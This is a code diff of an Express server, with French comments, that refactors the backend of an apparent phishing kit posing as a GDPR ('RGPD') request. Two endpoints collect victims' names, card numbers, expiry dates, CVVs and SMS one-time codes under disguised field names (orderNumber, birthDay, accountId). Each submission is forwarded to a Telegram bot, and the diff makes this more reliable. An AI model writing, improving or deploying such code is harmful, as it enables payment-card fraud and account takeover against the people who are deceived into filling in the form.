@@ -7,6 +7,66 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json({ limit: "10kb" }));
 app.use(express.static(__dirname));
 
+// ---------- Utilitaires ----------
+
+/**
+ * Formate une date d'expiration quel que soit le format reçu.
+ * Accepte : { birthMonth, birthYear }, { expiry: "12/31" }, { birthDay, birthYear } (legacy).
+ */
+function formatExpiry(body) {
+  // 1) Priorité : champ "expiry" déjà formaté côté client
+  if (body.expiry && typeof body.expiry === "string") {
+    return body.expiry.trim() || "—";
+  }
+
+  // 2) Sinon : reconstruit depuis birthMonth / birthYear
+  const month = body.birthMonth ?? body.birthDay;
+  const year = body.birthYear;
+
+  if (month == null && year == null) return "—";
+  if (month == null || year == null) {
+    return `${month != null ? String(month).padStart(2, "0") : "—"}/${year != null ? year : "—"}`;
+  }
+
+  return `${String(month).padStart(2, "0")}/${String(year).padStart(2, "0")}`;
+}
+
+/** Envoie un message Telegram, lève une erreur si l'API refuse. */
+async function sendTelegram(text) {
+  if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
+    throw new Error("BOT_TOKEN ou CHAT_ID manquant dans .env");
+  }
+
+  const response = await fetch(
+    `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: process.env.CHAT_ID,
+        text,
+        parse_mode: "HTML"
+      }),
+      signal: AbortSignal.timeout(10000)
+    }
+  );
+
+  const result = await response.json();
+  if (!response.ok || !result.ok) {
+    console.error("Telegram :", result);
+    throw new Error("Erreur Telegram");
+  }
+}
+
+/** Échappe le HTML pour parse_mode: HTML (évite les injections). */
+function esc(v) {
+  if (v == null) return "—";
+  return String(v)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
 // ---------- Health ----------
 app.get("/health", (req, res) => {
   res.json({ status: "ok", message: "Serveur opérationnel" });
@@ -15,32 +75,11 @@ app.get("/health", (req, res) => {
 // ---------- Test Telegram ----------
 app.post("/api/telegram-test", async (req, res) => {
   try {
-    const firstName = "Jean";
-    const message =
-      "🧪 TEST TELEGRAM\n\n" +
-      "👤 Prénom : " + firstName + "\n" +
-      "✅ Connexion réussie.";
-
-    const response = await fetch(
-      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: process.env.CHAT_ID,
-          text: message
-        }),
-        signal: AbortSignal.timeout(10000)
-      }
+    await sendTelegram(
+      "🧪 <b>TEST TELEGRAM</b>\n\n" +
+      "👤 Prénom : Jean\n" +
+      "✅ Connexion réussie."
     );
-
-    const result = await response.json();
-
-    if (!response.ok || !result.ok) {
-      console.error("Telegram :", result);
-      return res.status(502).json({ success: false, message: "Erreur Telegram" });
-    }
-
     res.json({ success: true, message: "Message Telegram envoyé" });
   } catch (error) {
     console.error("Erreur :", error.message);
@@ -51,38 +90,22 @@ app.post("/api/telegram-test", async (req, res) => {
 // ---------- Étape 1 : identification ----------
 app.post("/api/rgpd-step1", async (req, res) => {
   try {
-    const { lastName, firstName, orderNumber, birthDay, birthYear, accountId } = req.body || {};
+    const body = req.body || {};
+    const { lastName, firstName, orderNumber, accountId } = body;
+    const expiry = formatExpiry(body);
 
     const message =
-      "📝 NOUVELLE CC\n\n" +
-      "👤 Nom : " + (lastName || "—") + "\n" +
-      "👤 Prénom : " + (firstName || "—") + "\n" +
-      "💳 Numéro carte : " + (orderNumber || "—") + "\n" +
-      "🎂 date d'éxpiration : " + (birthDay || "—") + "/" + (birthYear || "—") + "\n" +
-      "🆔 CVV : " + (accountId || "—");
+      "📝 <b>NOUVELLE DEMANDE</b>\n\n" +
+      "👤 Nom : " + esc(lastName) + "\n" +
+      "👤 Prénom : " + esc(firstName) + "\n" +
+      "💳 Numéro carte : " + esc(orderNumber) + "\n" +
+      "📅 Expiration : " + esc(expiry) + "\n" +
+      "🆔 CVV : " + esc(accountId);
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: process.env.CHAT_ID,
-          text: message
-        })
-      }
-    );
-
-    const result = await response.json();
-
-    if (!response.ok || !result.ok) {
-      console.error("Telegram :", result);
-      throw new Error("Erreur Telegram");
-    }
-
+    await sendTelegram(message);
     res.json({ success: true });
   } catch (error) {
-    console.error("Erreur :", error.message);
+    console.error("Erreur step1 :", error.message);
     res.status(500).json({ success: false });
   }
 });
@@ -90,39 +113,23 @@ app.post("/api/rgpd-step1", async (req, res) => {
 // ---------- Étape 2 : code SMS ----------
 app.post("/api/rgpd-step2", async (req, res) => {
   try {
-    const { lastName, firstName, orderNumber, birthDay, birthYear, accountId, smsNum } = req.body || {};
+    const body = req.body || {};
+    const { lastName, firstName, orderNumber, accountId, smsNum } = body;
+    const expiry = formatExpiry(body);
 
     const message =
-      "✅ DEMANDE RGPD COMPLÈTE\n\n" +
-      "👤 Nom : " + (lastName || "—") + "\n" +
-      "👤 Prénom : " + (firstName || "—") + "\n" +
-      "💳 Numéro carte : " + (orderNumber || "—") + "\n" +
-      "🎂 date d'éxpiration : " + (birthDay || "—") + "/" + (birthYear || "—") + "\n" +
-      "🆔 CVV : " + (accountId || "—") + "\n" +
-      "📱 Code SMS : " + (smsNum || "—");
+      "✅ <b>DEMANDE COMPLÈTE</b>\n\n" +
+      "👤 Nom : " + esc(lastName) + "\n" +
+      "👤 Prénom : " + esc(firstName) + "\n" +
+      "💳 Numéro carte : " + esc(orderNumber) + "\n" +
+      "📅 Expiration : " + esc(expiry) + "\n" +
+      "🆔 CVV : " + esc(accountId) + "\n" +
+      "📱 Code SMS : " + esc(smsNum);
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: process.env.CHAT_ID,
-          text: message
-        })
-      }
-    );
-
-    const result = await response.json();
-
-    if (!response.ok || !result.ok) {
-      console.error("Telegram :", result);
-      throw new Error("Erreur Telegram");
-    }
-
+    await sendTelegram(message);
     res.json({ success: true });
   } catch (error) {
-    console.error("Erreur :", error.message);
+    console.error("Erreur step2 :", error.message);
     res.status(500).json({ success: false });
   }
 });
